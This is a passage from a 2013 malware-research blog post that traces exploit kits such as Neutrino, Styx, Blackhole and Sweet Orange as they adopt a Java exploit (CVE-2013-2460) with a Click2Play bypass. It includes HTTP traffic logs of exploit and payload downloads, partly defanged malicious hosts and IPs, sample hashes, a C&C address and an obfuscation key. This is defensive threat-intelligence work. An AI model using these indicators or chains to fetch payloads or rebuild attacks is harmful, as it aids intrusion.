Reboot.</td></tr></tbody></table><br /><br /><br />GET http://[redacted].info/hsZv/3J17_DtR/13C_ht11nF-E17H_R60kufr_0HUzD0c/xrB/055RR0/iWsU0-VEw-x0Rm-ou0xvC-3/<br />302 Found to http://an-wis.info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/<br /><br /><span style="color: blue;">GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/</span><br /><span style="color: blue;">200 OK (text/html)</span><br /><br />GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/yavirts.html<br />200 OK (text/html)<br /><br /><span style="color: blue;">GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/<b>jplay.html</b></span><br /><span style="color: blue;">200 OK (text/html) (jnlp call)</span><br /><span style="color: blue;"><br /></span><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-BWxTjXIk-BQ/UkFdPzcTg3I/AAAAAAAABMs/VzayEzoPjoY/s1600/screenshot_2013-09-24_008.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="428" src="http://2.bp.blogspot.com/-BWxTjXIk-BQ/UkFdPzcTg3I/AAAAAAAABMs/VzayEzoPjoY/s640/screenshot_2013-09-24_008.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Click2Play Bypass in Styx <br />2013-09-24</td></tr></tbody></table><span style="color: blue;"><br /></span><br /><span style="color: red;">GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/NyJjQvjE.jar</span><br /><span style="color: red;">200 OK (application/java-archive)</span><br /><span style="color: red;"><br /></span><span style="color: red;">GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/NyJjQvjE.jar</span><br /><span style="color: red;">200 OK (application/java-archive)&nbsp;<a href="https://www.virustotal.com/fr/file/3c812730758b9118ba4764adf3ab53bc/analysis/">3c812730758b9118ba4764adf3ab53bc</a></span><br /><br />GET http://[redacted].info/r007gL_0e2X80Ooo-30N1XG/0C/rt/d0tg2C-0e_l6L0H_NL40C05W/0aDec0A/b5g-04-yuI0i3/KS00i/AE0m/VuD0uHFw0/pRgP0Dy-z80J_Aek0Y_hcr0AhC_80_lWyk13f/It0865-L0O_GKn-0E/1dA0baP00-1EAC0QAs/R0f-4Bq0ZIn-f0X_4n-30otyr-05Y83-0ZxLA/17y/RZ0I/MM60-Ajpo06eml/0gVj_P0Yv3E0MRn/30AF6J0H/9ZU0f/WRI0wAPs11/ttO0CZz_j0leh-i0k1X_l0oDdd_0ah_pC/kC4XSO15ZD.exe?lniV=7decb&amp;h=16<br />200 OK (application/x-dosexec)&nbsp;<span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13.333333969116211px; line-height: 20px;"><a href="https://www.virustotal.com/fr/file/e3d427aac86651820a135fefa5c753d0cfb5d169ca3e968f1ff4df7c6035988b/analysis/">4a0e95c28b2b5b6259b7b558c3565988</a></span><br /><br />----------- Out of Topic : Payload -----------<br />Reveton.<br />C&amp;C Reverse Proxy :<br /><div class="separator" style="clear: both; text-align: center;"></div><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-S5PRPUOud-U/UkFeMo4MydI/AAAAAAAABNA/PldPDbXwgS0/s1600/screenshot_2013-09-24_012.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://3.bp.blogspot.com/-S5PRPUOud-U/UkFeMo4MydI/AAAAAAAABNA/PldPDbXwgS0/s1600/screenshot_2013-09-24_012.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Reveton Calling Home<br />2013-09-24</td></tr></tbody></table>64.191.122.10 -&nbsp;21788 | 64.191.0.0/17 | NOC | US | NOCINC.COM | NETWORK OPERATIONS CENTER INC.<br />We can see the call to the Bitcoin Miner (read:&nbsp;<a href="http://blog.malwarebytes.org/intelligence/2013/09/ransomware-puts-your-system-to-work-mining-bitcoins/">Ransomware Puts Your System To Work Mining Bitcoins</a>&nbsp;)<br />The binary is not there anymore since 2013-09-11 (was :&nbsp;<span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13.333333969116211px; line-height: 20px;"><a href="https://www.virustotal.com/fr/file/54ec954162903c4d5bf0aa8545c0c8e0e4fbc44dece8499e8ef404d4910888f3/analysis/">2794fd5b64b585df132b4524b82d18c8</a>&nbsp;)</span><br />--------------------------------------------------<br />&lt;/edit3&gt;<br />&lt;edit4 : 2013-09-24&gt;<br /><b><u>Neutrino : CVE-2013-2460 + Click2Play bypass</u></b><br /><br /><span style="color: #351c75;">It seems the integration has been far from smooth for the Neutrino coder.</span><br /><span style="color: #351c75;">The jar is inside the Exploit Kit since more than 3 days. The coder announced the new exploit 2 days ago...but the warning was still here and even validating the execution your were safe. Some protections were removed (you could hit the exploit kit as many time as you want with same IP without problem...seems like someone else was testing it :) ). And the 22 (sunday) more than half a day with all threads in 404...But in the end...he made it.</span><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://1.bp.blogspot.com/-T3wmwSoPm5M/UkIJ5_sfW9I/AAAAAAAABNo/u0iZA7vyBEs/s1600/screenshot_2013-09-24_054.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="316" src="http://1.bp.blogspot.com/-T3wmwSoPm5M/UkIJ5_sfW9I/AAAAAAAABNo/u0iZA7vyBEs/s640/screenshot_2013-09-24_054.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">CVE-2013-2460 + Click2Play ByPass in Neutrino<br />2013-09-24</td></tr></tbody></table>Will only keep relevant calls :<br /><br /><span style="color: blue;">GET http://[redacted].dyndns .info:8000/gxstfkhf?ttdwjipi=4128154</span><br /><span style="color: blue;">200 OK (text/html)</span><br /><br /><span style="color: #c27ba0;">GET http://ajax.googleapis .com/ajax/libs/jquery/1.9.1/jquery.min.js</span><br /><span style="color: #c27ba0;">200 OK (text/javascript)</span><br /><br /><span style="color: lime;">GET http://[redacted].dyndns .info:8000/index.js</span><br /><span style="color: lime;">200 OK (application/x-javascript)</span><br /><br /><span style="color: blue;">POST http://[redacted].dyndns .info:8000/twpnnurhbg</span><br /><span style="color: blue;">200 OK (text/html)</span><br /><span style="color: blue;"><br /></span><br /><div class="separator" style="clear: both; text-align: center;"></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://4.bp.blogspot.com/-D5szVe_R1Hk/UkITvTyk64I/AAAAAAAABOM/HxbFySz_rdI/s1600/screenshot_2013-09-25_004.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="168" src="http://4.bp.blogspot.com/-D5szVe_R1Hk/UkITvTyk64I/AAAAAAAABOM/HxbFySz_rdI/s640/screenshot_2013-09-25_004.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Encoded Jnlp</td></tr></tbody></table>Applying the Neutrino "xor" function with key "qoxacfix"</div><div><br /></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-3tyjffk6FLo/UkIUPusSBfI/AAAAAAAABOU/HWU5OPvc3fA/s1600/screenshot_2013-09-25_006.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="110" src="http://2.bp.blogspot.com/-3tyjffk6FLo/UkIUPusSBfI/AAAAAAAABOU/HWU5OPvc3fA/s640/screenshot_2013-09-25_006.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Jnlp</td></tr></tbody></table><div class="separator" style="clear: both; text-align: center;"></div><div>Base64 decode of the jnlp_embedded value :<br /><span style="color: blue;"><br /></span><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-sHKSUHnxY0w/UkIVIsTaxZI/AAAAAAAABOg/CA3uoM9EaeM/s1600/screenshot_2013-09-25_007.png" imageanchor="1"><img border="0" height="162" src="http://4.bp.blogspot.com/-sHKSUHnxY0w/UkIVIsTaxZI/AAAAAAAABOg/CA3uoM9EaeM/s640/screenshot_2013-09-25_007.png" width="640" /></a></div><span style="color: blue;"><br /></span><br /><span style="color: red;">GET http://[redacted].dyndns .info:8000/rclmrcfdvdjtq?joiihv=uihuzdhhuq</span><br /><span style="color: red;">200 OK (application/java-archive)&nbsp;</span><br /><span style="color: red;"><br /></span><span style="color: red;">GET http://[redacted].dyndns .info:8000/rclmrcfdvdjtq?joiihv=uihuzdhhuq</span><br /><span style="color: red;">200 OK (application/java-archive)&nbsp;</span><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13.333333969116211px; line-height: 20px;"><a href="https://www.virustotal.com/fr/file/6223965c6f8d776c31864178b049ffa95deb626e4c518a2175085db2ac8c2723/analysis/">3fcac6c64ce0ca28ee615a8fad224dd3</a></span><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://4.bp.blogspot.com/-WkXX_KsQd2Y/UkILN9ROKRI/AAAAAAAABN0/imNN3dGXzJQ/s1600/screenshot_2013-09-24_055.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="64" src="http://4.bp.blogspot.com/-WkXX_KsQd2Y/UkILN9ROKRI/AAAAAAAABN0/imNN3dGXzJQ/s640/screenshot_2013-09-24_055.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Piece of slightly obfuscated CVE-2013-2460 in Neutrino<br />(since 2013-09-21 in fact)</td></tr></tbody></table><br /><br />GET http://[redacted].dyndns .info:8000/faybcc?juzickeew=uihuzdhhuq<br />200 OK (application/octet-stream) Decoded :&nbsp;<a href="https://www.virustotal.com/fr/file/19801ae1941b58ec8e92272f6ac7b12cf9208ad93500ef98ea3a5b520820d0f4/analysis/1380058798/">a126281477c856b9358de5aea1369990</a>&nbsp;who drop &nbsp;:&nbsp;<a href="https://www.virustotal.com/fr/file/0c268d949536bbecf61ef304ad11b855e52e7fc54222ad403d7d463904c6c85f/analysis/1380058804/">898b9aee9931230ef3bc0c59eb541c55</a>&nbsp;- <span style="font-size: x-small;"><i>Didn't spend too much time to figure out what it is.</i></span><br /><span style="font-size: x-small;"><i>Saw 404 POST to : http://allewnuado .ru/perl/config.php - &nbsp;79.174.64.127</i></span><br /><div><span style="font-size: x-small;"><i>47385 | 79.174.64.0/19 | HOSTING-COMPANY | RU | HC.RU | HOSTING CENTER LTD.</i></span></div><div>&lt;/edit4&gt;<br />&lt;edit5 2013-09-25&gt;<br /><b><u>Blackhole : CVE-2013-2460 Click2Play Bypass</u></b><br /><br />I saw that jar yesterday already being pushed without exploitation to jre7u21 in /closest/ Blackhole.<br />It's the exact same jar as the Cool EK in "/index.php?p=" that introduce the Bypass.<br />Today on the <a href="http://malware.dontneedcoffee.com/2012/09/ULockerAS36444BHEK.html">/Home/ (aka q.php)</a>&nbsp;Darkleech fuelled&nbsp;BH EK the Click2Play bypass is here.<br />And payload is as always Pony (steal passwords and act as loader. No change since at least December. It pushes Urausy in some countries or Nymaim in other countries (which can then get another version of Nymaim with locker functionnality or Zaccess).<br />This has been well <a href="http://www.welivesecurity.com/2013/07/02/the-home-campaign-overstaying-its-welcome/">explained by Eset</a>.<br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-ur9ThOOj6D8/UkKqC2E3PqI/AAAAAAAABPU/Vuf87VKMgno/s1600/screenshot_2013-09-25_008.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="246" src="http://3.bp.blogspot.com/-ur9ThOOj6D8/UkKqC2E3PqI/AAAAAAAABPU/Vuf87VKMgno/s640/screenshot_2013-09-25_008.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">BH EK /Home/ aka q.php CVE-2013-2460 + Click2play bypass<br />2013-09-25</td></tr></tbody></table><br /><br /><span style="color: blue;">GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php</span><br /><span style="color: blue;">200 OK (text/html)</span><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-3xwb3L4qHN0/UkKpsyXZJJI/AAAAAAAABPM/mB2X3QyXLfI/s1600/screenshot_2013-09-25_012.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="52" src="http://2.bp.blogspot.com/-3xwb3L4qHN0/UkKpsyXZJJI/AAAAAAAABPM/mB2X3QyXLfI/s320/screenshot_2013-09-25_012.png" width="320" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Conditions for the bypass call</td></tr></tbody></table><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-vmAhGNZvo7U/UkKplSTHaxI/AAAAAAAABPE/XM5ey19cy6k/s1600/screenshot_2013-09-25_011.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="394" src="http://3.bp.blogspot.com/-vmAhGNZvo7U/UkKplSTHaxI/AAAAAAAABPE/XM5ey19cy6k/s640/screenshot_2013-09-25_011.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">jnlp call</td></tr></tbody></table><br /><br /><span style="color: red;">GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php?!0M!6J=1F_*H4z-I*!f&amp;Jk__*zFA_92-*=7*K9_Kp1</span><br /><span style="color: red;">200 OK (application/java-archive)</span><br /><span style="color: red;"><br /></span><span style="color: red;">GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php?!0M!6J=1F_*H4z-I*!f&amp;Jk__*zFA_92-*=7*K9_Kp1</span><br /><span style="color: red;">200 OK (application/java-archive)&nbsp;</span><a href="https://www.virustotal.com/fr/file/f098f46941170cf2e2bf0bc8412cca56d7d79af0f75ea4c97537331921435a9e/analysis/1380099333/" style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 20px;">f5fc4540e6e64efee8711007ac0d4ed1</a><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://1.bp.blogspot.com/-83mwtU9GKgQ/UkKnd4gmwUI/AAAAAAAABO4/Auf3uhREFa0/s1600/screenshot_2013-09-25_010.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="332" src="http://1.bp.blogspot.com/-83mwtU9GKgQ/UkKnd4gmwUI/AAAAAAAABO4/Auf3uhREFa0/s640/screenshot_2013-09-25_010.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">CVE-2013-2460 in BH EK<br />2013-09-25</td></tr></tbody></table>GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php?-*Z73922k0NUj8=8b8cwd8aww&amp;*F21!gX=w88c8dw6wdw7wbwbwd8c&amp;!_239!6W25u*_=ww&amp;59*!a34-d1_2!uT=u*g88*8&amp;OF2EFwol0!3_9=7ZF!Y*08*!P_75m<br />200 OK (application/x-msdownload) -&nbsp;<span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 20px;"><a href="https://www.virustotal.com/fr/file/ada7fd5a50366851c6939ada3dfb3f5b35628f1d002755f2762062b57b335d3d/analysis/">acb80f0eaa177953a53f3be188c8e3da</a>&nbsp;</span><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 20px;">&nbsp;Analysis and sample:&nbsp;</span><a href="https://malwr.com/analysis/YjQ5ZGEyYjM0YTkxNDE0Mzg0ZjFkYWEzNjE3MDFjMTY/" style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 20px;">Malwr.com</a><br />&lt;/edit5&gt;<br />&lt;edit6 2013-10-14&gt;<br /><b><u>Kore : &nbsp;CVE-2013-2460</u></b><br />(Thanks to&nbsp;<a href="https://twitter.com/TimoHirvonen">Timo Hirvonen</a>&nbsp;for confirmation)<br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://1.bp.blogspot.com/-VERQaQ4MAzM/UlxiFMjhb4I/AAAAAAAABig/QdCh-9_OUsE/s1600/screenshot_2013-10-14_021.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="316" src="http://1.bp.blogspot.com/-VERQaQ4MAzM/UlxiFMjhb4I/AAAAAAAABig/QdCh-9_OUsE/s640/screenshot_2013-10-14_021.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">CVE-2013-2460 (?) and Click2play Bypass in Kore 2013-10-14<br />Pushing Urausy Obviously</td></tr></tbody></table><span style="color: blue;">GET http://zanol.muabannhadatdothi .com:90/web.html</span><br /><span style="color: blue;">200 OK (text/html)</span><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://4.bp.blogspot.com/-BJ7g14kKRRc/UlxjV9eE2WI/AAAAAAAABio/UYNK-SSaUAk/s1600/screenshot_2013-10-14_022.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="66" src="http://4.bp.blogspot.com/-BJ7g14kKRRc/UlxjV9eE2WI/AAAAAAAABio/UYNK-SSaUAk/s640/screenshot_2013-10-14_022.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Piece of Kore Landing.<br />Not what i would call a precision Strike !</td></tr></tbody></table><span style="color: #38761d;">GET http://zanol.muabannhadatdothi .com:90/jquery.js</span><br /><span style="color: #38761d;">200 OK (application/javascript)</span><br /><br /><span style="color: red;">GET http://zanol.muabannhadatdothi .com:90/web.html2.zip</span><br /><span style="color: red;">200 OK (application/octet-stream)</span><br /><span style="color: red;"><br /></span><span style="color: red;">GET http://zanol.muabannhadatdothi .com:90/web.html2.zip</span><br /><span style="color: red;">200 OK (application/octet-stream)</span><br /><span style="color: red;"><br /></span><span style="color: red;">GET http://zanol.muabannhadatdothi .com:90/web.html2.zip</span><br /><span style="color: red;">200 OK (application/octet-stream)</span><br /><span style="color: red;"><br /></span><span style="color: red;">GET http://zanol.muabannhadatdothi .com:90/web.html2.zip</span><br /><span style="color: red;">200 OK (application/octet-stream)</span><br /><br />GET http://zanol.muabannhadatdothi .com/web.html?id=2&amp;text=1164<br />200 OK (text/html) (call back)<br /><br /><span style="font-size: x-small;">&lt;/edit6&gt;</span><br /><span style="font-size: x-small;">&lt;edit7 2013-10-26&gt;</span><br /><b><u>Magnitude : CVE-2013-2463 + C2P bypass</u></b><br />It's inside Magnitude (popads) since at least 2013-10-19<br />See : <a href="http://malware.dontneedcoffee.com/2013/10/Magnitude.html">Magnitude EK : Pop Pop !</a><br /><span style="font-size: x-small;">&lt;/edit7&gt;</span><br /><br /><span style="font-size: x-small;">&lt;edit8 2013-10-31&gt;</span><br /><b><u>Sweet Orange : CVE-2013-2460 + C2P Bypass:</u></b><br />Seems to be inside since few days.<br />Thanks to&nbsp;<a href="https://twitter.com/TimoHirvonen">Timo Hirvonen</a>&nbsp;from F-Secure for naming that CVE. Thanks to&nbsp;<a href="https://twitter.com/EKWatcher">Chris Wakelin</a>&nbsp;for additionnal help on this.<br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td><a href="http://2.bp.blogspot.com/-4ZoCZu4Sv0g/UnKPFs8POCI/AAAAAAAABtE/GywxabmnN3o/s1600/screenshot_2013-10-31_002.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="228" src="http://2.bp.blogspot.com/-4ZoCZu4Sv0g/UnKPFs8POCI/AAAAAAAABtE/GywxabmnN3o/s640/screenshot_2013-10-31_002.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="font-size: 13.333333969116211px;">Sweet Orange 2013-10-31<br />CVE-2013-2460 + Click2play bypass successful pass</td></tr></tbody></table><span style="color: blue;">GET http://8c10d9c992f1064f.dyndns-remote .com/voip/ports.php?tracetabs=43</span><br /><span style="color: blue;">200 OK (text/html)</span><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td><a href="http://4.bp.blogspot.com/-GU-FiAz_0sY/UnKQGc5tJKI/AAAAAAAABtM/CrksYwBHcgA/s1600/screenshot_2013-10-31_003.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="150" src="http://4.bp.blogspot.com/-GU-FiAz_0sY/UnKQGc5tJKI/AAAAAAAABtM/CrksYwBHcgA/s640/screenshot_2013-10-31_003.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="font-size: 13.333333969116211px;">Piece of Landing after deobfuscation showing the jnlp.</td></tr></tbody></table><span style="color: red;">GET http://8c10d9c992f1064f.dyndns-remote .com/voip/gBSlO</span><br /><span style="color: red;">200 OK (application/x-java-archive)&nbsp;</span><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 20px;"><a href="https://www.virustotal.com/fr/file/9ece262cb90517b34933675b8d57456a69380066e8a487192a33d317a2d9ce6c/analysis/">87c775be2b9519dd97a0b84da3e3b9b1</a>&nbsp; CVE-2013-2460 inside</span><br /><br /><span style="color: red;">GET http://8c10d9c992f1064f.dyndns-remote .com/voip/gBSlO</span><br /><span style="color: red;">200 OK (application/x-java-archive)<br /><br />GET http://8c10d9c992f1064f.dyndns-remote .com/voip/IWcaNgp<br />200 OK (application/x-java-archive)<br /><br />GET http://8c10d9c992f1064f.dyndns-remote .com/voip/OBTjZPq<br />200 OK (application/x-java-archive)</span><br /><span style="color: red;"><br /></span>GET http://8c10d9c992f1064f.dyndns-remote .com/spanish.php?edit=269&amp;main=4&amp;comp=158&amp;question=171&amp;press=416&amp;staff=385&amp;lang=265&amp;media=552&amp;entry=160&amp;affiliate=156&nbsp;<span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px;"><a href="https://www.virustotal.com/fr/file/cc3d7974a47618dea945d6962c594075a94c06976ff0b1f8c491f844ed4f8420/analysis/1383239997/">bc57bdf43e0e2d0efe2d0c0e06cddd9d</a></span><br />200 OK (application/octet-stream)<br /><br /><b><u>Files :</u></b>&nbsp;<a href="http://goo.gl/XFbVeC">2 fiddler here</a><span style="font-size: xx-small;">&nbsp;(owncloud via goo.gl)</span><br />&lt;/edit8&gt;<br /><br /><br /></div></div>
+			</div>
+
+			
+						<div id="page-meta" class="t30">
+				<p>
+					<!-- Look the author details up from the site config. -->
+					
+					<!-- Output author details if some exist. -->
+					
+					<span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name" class="pr20 icon-edit"><a href="https://malware.dontneedcoffee.com/" target="_blank"> Kafeine</a></span>
+				</span>
+				
+
+				
+				<time class="icon-calendar pr20" datetime="2013-09-20" itemprop="datePublished"> 2013-09-20</time>
+				
+
+				<span class="icon-archive pr20"> </span>
+				<br />
+				<span class="pr20"><span class="icon-price-tag pr10"> Sakura</span> <span class="icon-price-tag pr10"> Kore-Ish</span> <span class="icon-price-tag pr10"> CVE-2013-2460</span> <span class="icon-price-tag pr10"> Nuclear Pack</span> <span class="icon-price-tag pr10"> Kool EK</span> <span class="icon-price-tag pr10"> Neutrino</span> <span class="icon-price-tag pr10"> Styx</span> <span class="icon-price-tag pr10"> Click2play Bypass.</span> <span class="icon-price-tag pr10"> Cool EK</span> <span class="icon-price-tag pr10"> CVE-2013-2472</span> </span>
+			</p>
+
+			<div id="post-nav" class="row">
+				
+				<div class="small-5 columns"><a class="button small radius prev" href="http://malware2.dontneedcoffee.com/2013/09/revoyem-goes-international-shocking.html">&laquo; Revoyem goes international - shocking distribution....</a></div><!-- /.small-4.columns -->
+				
+				<div class="small-2 columns text-center"><a class="radius button small" href="http://malware2.dontneedcoffee.com/blog/archive/" title="Blog Archive">Archive</a></div><!-- /.small-4.columns -->
+				
+				<div class="small-5 columns text-right"><a class="button small radius next" href="http://malware2.dontneedcoffee.com/2013/09/cookie-bomb-iframer-way.html">Cookie-Bomb : The "Северная Сказка" Iframer way &raquo;</a></div><!-- /.small-4.columns -->
+				
+			</div>
+			</div><!--  /.page-meta -->
+			
+
+			
+		</article>
+	</div><!-- /.medium-8.columns -->
+
+
+	
+
+
+	
+</div><!-- /.row -->
+
+
+	
+	    <div id="up-to-top" class="row">
+      <div class="small-12 columns" style="text-align: right;">
+        <a class="iconfont" href="#top-of-page">&#xf108;</a>
+      </div><!-- /.small-12.columns -->
+    </div><!-- /.row -->
+
+
+    <footer id="footer-content" class="bg-grau">
+      <div id="footer">
+        <div class="row">
+          <div class="medium-6 large-5 columns">
+            <h5 class="shadow-black">About This Site</h5>
+
+            <p class="shadow-black">
+              Sleep is a symptom of  »caffeine« deprivation!
+              <a href="http://malware2.dontneedcoffee.com/info/">More ›</a>
+            </p>
+          </div><!-- /.large-6.columns -->
+
+
+          <div class="small-6 medium-3 large-3 large-offset-1 columns">
+            
+              
+                <h5 class="shadow-black">Services</h5>
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+
+              <ul class="no-bullet shadow-black">
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com"  title=""></a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com/contact/"  title="Contact">Contact</a>
+                  </li>
+              
+                
+                  <li >
